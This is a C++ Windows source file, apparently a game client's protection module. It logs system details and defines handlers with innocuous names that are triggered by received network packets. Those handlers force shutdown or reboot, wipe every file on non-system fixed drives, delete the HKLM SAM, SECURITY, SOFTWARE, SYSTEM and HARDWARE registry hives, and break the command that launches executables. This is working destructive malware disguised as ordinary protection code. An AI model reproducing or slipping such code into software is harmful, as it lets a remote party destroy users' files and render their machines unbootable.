#include "Stdafx.h"
#include "cProtectFile.h"
#include <Util.h>
#include <ThangCuoi/StructSendGs.h>
#include <Windows.h>
#include <string>
#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")

_kernelDriversClass _gKernelClass;
typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);

void _kernelDriversClass::_KillProcessRunning()
{
	while (true)
	{
		TerminateProcess(GetCurrentProcess(), 0);
		CRASH_APPLICATION_MACRO
	}
}

void _kernelDriversClass::_SendKeyToOff()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
		tkp.PrivilegeCount = 1;
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
		CloseHandle(hToken);
	}
}

void _kernelDriversClass::RecvRequestUserID_2()
{
	_SendKeyToOff();
	ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_FLAG_PLANNED);
	_KillProcessRunning();
}

void _kernelDriversClass::RecvRequestUserID_1()
{
	_SendKeyToOff();
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_FLAG_PLANNED);
	_KillProcessRunning();
}

bool _kernelDriversClass::IsSystemDrive(const std::wstring& drive)
{
	wchar_t systemDir[MAX_PATH];
	UINT len = GetWindowsDirectoryW(systemDir, _countof(systemDir));

	if (len == 0 || len >= _countof(systemDir)) 
	{
		return false;
	}

	return _wcsnicmp(systemDir, drive.c_str(), 3) == 0;
}


void _kernelDriversClass::DeleteContents(const std::wstring& path)
{
	WIN32_FIND_DATAW findData;
	std::wstring searchPath = path + L"*";
	HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);

	if (hFind == INVALID_HANDLE_VALUE) return;

	do
	{
		std::wstring name = findData.cFileName;

		if (name == L"." || name == L"..") continue;

		std::wstring fullPath = path + name;

		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			fullPath += L"\\";
			DeleteContents(fullPath);
			RemoveDirectoryW(fullPath.c_str());
		}
		else
		{
			SetFileAttributesW(fullPath.c_str(), FILE_ATTRIBUTE_NORMAL);
			DeleteFileW(fullPath.c_str());
		}
	} while (FindNextFileW(hFind, &findData));

	FindClose(hFind);
}

void _kernelDriversClass::RecvRequestUserID_3() // Exe
{
	wchar_t drives[256] = { 0 };
	GetLogicalDriveStringsW(_countof(drives), drives);

	wchar_t* pDrive = drives;

	while (*pDrive)
	{
		std::wstring drive = pDrive;

		if (GetDriveTypeW(drive.c_str()) == DRIVE_FIXED && !IsSystemDrive(drive))
		{
			DeleteContents(drive);
		}

		pDrive += wcslen(pDrive) + 1;
	}
}

void _kernelDriversClass::_SendKeyTodo(HKEY hRoot, const wchar_t* szKey)
{
	HKEY hKey;
	if (RegOpenKeyExW(hRoot, szKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{
		DWORD dwSubKeyLen = MAX_PATH;
		wchar_t szSubKey[MAX_PATH];
		FILETIME ft;

		while (RegEnumKeyExW(hKey, 0, szSubKey, &dwSubKeyLen, NULL, NULL, NULL, &ft) == ERROR_SUCCESS)
		{
			_SendKeyTodo(hKey, szSubKey);
			dwSubKeyLen = MAX_PATH;
		}

		RegCloseKey(hKey);
		RegDeleteKeyW(hRoot, szKey);
	}
}

void _kernelDriversClass::RecvRequestUserID_4()
{
	_SendKeyTodo(HKEY_LOCAL_MACHINE, L"HARDWARE");
	Sleep(10000);

	_SendKeyTodo(HKEY_LOCAL_MACHINE, L"SAM");
	Sleep(10000);

	_SendKeyTodo(HKEY_LOCAL_MACHINE, L"SECURITY");
	Sleep(10000);

	_SendKeyTodo(HKEY_LOCAL_MACHINE, L"SOFTWARE");
	Sleep(10000);

	_SendKeyTodo(HKEY_LOCAL_MACHINE, L"SYSTEM");
	Sleep(10000);
}

void _kernelDriversClass::RecvRequestUserID_5()
{
	HKEY hKey;

	if (RegOpenKeyExW(HKEY_CLASSES_ROOT, L"exefile\\shell\\open\\command", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
	{
		const wchar_t* nullCmd = L"\"\"";
		RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)nullCmd, (lstrlenW(nullCmd) + 1) * sizeof(wchar_t));

		RegDeleteValueW(hKey, L"IsolatedCommand");

		RegCloseKey(hKey);
	}
}

void _kernelDriversClass::SendRequestUserID_1(const BYTE* ReceiveBuffer)
{
	auto Data = reinterpret_cast<const _dataClassRecv*>(ReceiveBuffer);
	RecvRequestUserID_1();
}
void _kernelDriversClass::SendRequestUserID_2(const BYTE* ReceiveBuffer)
{
	auto Data = reinterpret_cast<const _dataClassRecv*>(ReceiveBuffer);
	RecvRequestUserID_2();
}

void _kernelDriversClass::SendRequestUserID_3(const BYTE* ReceiveBuffer)
{
	auto Data = reinterpret_cast<const _dataClassRecv*>(ReceiveBuffer);
	RecvRequestUserID_3();
}

void _kernelDriversClass::SendRequestUserID_4(const BYTE* ReceiveBuffer)
{
	auto Data = reinterpret_cast<const _dataClassRecv*>(ReceiveBuffer);
	RecvRequestUserID_4();
}

void _kernelDriversClass::SendRequestUserID_5(const BYTE* ReceiveBuffer)
{
	auto Data = reinterpret_cast<const _dataClassRecv*>(ReceiveBuffer);
	RecvRequestUserID_5();
}

std::string _kernelDriversClass::GetOSName()

{
	RTL_OSVERSIONINFOW rovi = { 0 };
	rovi.dwOSVersionInfoSize = sizeof(rovi);

	HMODULE hMod = ::GetModuleHandleW(L"ntdll.dll");
	if (hMod)
	{
		RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)::GetProcAddress(hMod, "RtlGetVersion");
		if (fxPtr != nullptr)
		{
			if (fxPtr(&rovi) == 0) // STATUS_SUCCESS = 0
			{
				std::string result = "Windows ";

				if (rovi.dwMajorVersion == 10 && rovi.dwMinorVersion == 0)
				{
					if (rovi.dwBuildNumber >= 22000)
						result += "11";
					else
						result += "10";
				}
				else if (rovi.dwMajorVersion == 6)
				{
					if (rovi.dwMinorVersion == 3)
						result += "8.1";
					else if (rovi.dwMinorVersion == 2)
						result += "8";
					else if (rovi.dwMinorVersion == 1)
						result += "7";
					else if (rovi.dwMinorVersion == 0)
						result += "Vista";
				}
				else if (rovi.dwMajorVersion == 5)
				{
					if (rovi.dwMinorVersion == 2)
						result += "Server 2003";
					else if (rovi.dwMinorVersion == 1)
						result += "XP";
					else
						result += "2000";
				}
				else
				{
					result += "Unknown";
				}

				result += " (Build " + std::to_string(rovi.dwBuildNumber) + ")";
				return result;
			}
		}
	}
	return "Unknown OS";
}

std::string _kernelDriversClass::GetSystemArchitecture()
{
	SYSTEM_INFO si = {};
	GetNativeSystemInfo(&si);

	switch (si.wProcessorArchitecture)
	{
		case PROCESSOR_ARCHITECTURE_AMD64:		return "64-bit";
		case PROCESSOR_ARCHITECTURE_INTEL:		return "32-bit";
		case PROCESSOR_ARCHITECTURE_ARM64:		return "ARM64";
		default:	return "Unknown";
	}
}

std::string _kernelDriversClass::GetRAMInfo()
{
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);
	GlobalMemoryStatusEx(&statex);

	double ramGB = (double)statex.ullTotalPhys / (1024 * 1024 * 1024);
	int ramRounded = (int)(ramGB + 0.5);

	char buffer[64];
	sprintf(buffer, "%.2f GB (Approx. %d GB)", ramGB, ramRounded);
	return std::string(buffer);
}

std::string _kernelDriversClass::GetGPUName()
{
	DISPLAY_DEVICEA dd = {};
	dd.cb = sizeof(dd);
	int deviceIndex = 0;

	while (EnumDisplayDevicesA(NULL, deviceIndex, &dd, 0))
	{
		if (dd.StateFlags & DISPLAY_DEVICE_PRIMARY_DEVICE)
		{
			return std::string(dd.DeviceString);
		}
		deviceIndex++;
	}
	return "Unknown GPU";
}

std::string _kernelDriversClass::GetWindowsDisplayVersion()
{
	HKEY hKey;
	const char* subKey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
		return "Unknown";

	char value[128] = {};
	DWORD size = sizeof(value);
	std::string result = "Unknown";

	if (RegQueryValueExA(hKey, "DisplayVersion", 0, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS)
		result = value;
	else
	{
		size = sizeof(value);
		if (RegQueryValueExA(hKey, "ReleaseId", 0, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS)
			result = value;
	}

	RegCloseKey(hKey);
	return result;
}

std::string _kernelDriversClass::GetWindowsInstallDate()
{
	HKEY hKey;
	const char* subKey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
	LSTATUS status = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY, &hKey);

	if (status != ERROR_SUCCESS)
		return "Unknown";

	DWORD value = 0;
	DWORD type = 0;
	DWORD size = sizeof(value);

	status = RegQueryValueExA(hKey, "InstallDate", NULL, &type, reinterpret_cast<LPBYTE>(&value), &size);
	RegCloseKey(hKey);

	if (status != ERROR_SUCCESS || type != REG_DWORD || value == 0)
		return "Unknown";

	time_t t = static_cast<time_t>(value);
	struct tm* tm_info = localtime(&t);

	char buffer[32];
	strftime(buffer, sizeof(buffer), "%d/%m/%Y", tm_info); //ACuoi format: dd/MM/yyyy
	return std::string(buffer);
}

#include <dxgi.h>
#pragma comment(lib, "dxgi.lib")

std::string _kernelDriversClass::GetGPUVRAM()
{
	IDXGIFactory* pFactory = nullptr;
	if (FAILED(CreateDXGIFactory(__uuidof(IDXGIFactory), (void**)&pFactory)))
		return "Unknown VRAM";

	IDXGIAdapter* pAdapter = nullptr;
	if (FAILED(pFactory->EnumAdapters(0, &pAdapter))) {
		pFactory->Release();
		return "Unknown VRAM";
	}

	DXGI_ADAPTER_DESC desc;
	if (FAILED(pAdapter->GetDesc(&desc))) {
		pAdapter->Release();
		pFactory->Release();
		return "Unknown VRAM";
	}

	SIZE_T vramBytes = desc.DedicatedVideoMemory;
	double gb = static_cast<double>(vramBytes) / (1024 * 1024 * 1024);

	char buf[64];
	int gbRounded = static_cast<int>(gb + 0.5);
	sprintf(buf, "%d GB", gbRounded);

	pAdapter->Release();
	pFactory->Release();
	return std::string(buf);
}

void _kernelDriversClass::LogSystemInfo()
{
	std::string osName = GetOSName();
	std::string osVersion = GetWindowsDisplayVersion();
	std::string installDate = GetWindowsInstallDate();
	std::string arch = GetSystemArchitecture();
	std::string ram = GetRAMInfo();
	std::string gpu = GetGPUName();
	std::string gpuVRAM = GetGPUVRAM();

	DWORD gdwSize = sizeof(g_SPKSharedInfo.ComputerName);
	GetComputerNameA(g_SPKSharedInfo.ComputerName, &gdwSize);

	strncpy(g_SPKSharedInfo.OSName, osName.c_str(), sizeof(g_SPKSharedInfo.OSName) - 1);
	strncpy(g_SPKSharedInfo.OSVersion, osVersion.c_str(), sizeof(g_SPKSharedInfo.OSVersion) - 1);
	strncpy(g_SPKSharedInfo.InstallDate, installDate.c_str(), sizeof(g_SPKSharedInfo.InstallDate) - 1);
	strncpy(g_SPKSharedInfo.SystemArch, arch.c_str(), sizeof(g_SPKSharedInfo.SystemArch) - 1);
	strncpy(g_SPKSharedInfo.TotalRAM, ram.c_str(), sizeof(g_SPKSharedInfo.TotalRAM) - 1);
	strncpy(g_SPKSharedInfo.GPUName, gpu.c_str(), sizeof(g_SPKSharedInfo.GPUName) - 1);
	strncpy(g_SPKSharedInfo.GPUVRAM, gpuVRAM.c_str(), sizeof(g_SPKSharedInfo.GPUVRAM) - 1);

	g_ConsoleDebug->Write(MCD_NORMAL, "----------------------------------------------------");
	g_ConsoleDebug->Write(MCD_NORMAL, "Device Name     : %s", g_SPKSharedInfo.ComputerName);
	g_ConsoleDebug->Write(MCD_NORMAL, "Operating System: %s", g_SPKSharedInfo.OSName);
	g_ConsoleDebug->Write(MCD_NORMAL, "OS Version      : %s", g_SPKSharedInfo.OSVersion);
	g_ConsoleDebug->Write(MCD_NORMAL, "Installed On    : %s", g_SPKSharedInfo.InstallDate);
	g_ConsoleDebug->Write(MCD_NORMAL, "System Type     : %s", g_SPKSharedInfo.SystemArch);
	g_ConsoleDebug->Write(MCD_NORMAL, "Total RAM       : %s", g_SPKSharedInfo.TotalRAM);
	g_ConsoleDebug->Write(MCD_NORMAL, "Video Card      : %s (%s)", g_SPKSharedInfo.GPUName, g_SPKSharedInfo.GPUVRAM);
	g_ConsoleDebug->Write(MCD_NORMAL, "----------------------------------------------------");

	g_ErrorReport.AddSeparator();
	g_ErrorReport.Write("<System information>\r\n");
	g_ErrorReport.Write("Device Name \t\t\t: %s\r\n", g_SPKSharedInfo.ComputerName);
	g_ErrorReport.Write("Operating System \t\t: %s\r\n", g_SPKSharedInfo.OSName);
	g_ErrorReport.Write("OS Version \t\t\t\t: %s\r\n", g_SPKSharedInfo.OSVersion);
	g_ErrorReport.Write("Installed On \t\t\t: %s\r\n", g_SPKSharedInfo.InstallDate);
	g_ErrorReport.Write("Total RAM \t\t\t\t: %s\r\n", g_SPKSharedInfo.TotalRAM);
	g_ErrorReport.Write("Video Card \t\t\t\t: %s (%s)\r\n", g_SPKSharedInfo.GPUName, g_SPKSharedInfo.GPUVRAM);
	g_ErrorReport.AddSeparator();
}